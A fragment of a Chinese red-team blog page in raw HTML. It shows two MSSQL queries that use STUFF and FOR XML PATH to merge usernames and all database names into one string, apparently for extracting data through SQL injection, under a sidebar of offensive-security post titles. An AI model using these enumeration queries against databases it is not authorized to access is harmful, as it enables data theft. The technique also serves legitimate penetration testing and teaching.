<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">Top</span> <span class="mi">10</span> <span class="n">username</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="k">User</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>取得所有数据库名</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">Name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span>  <span class="n">Name</span> <span class="k">from</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>其他场景自行想象！</p>

  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
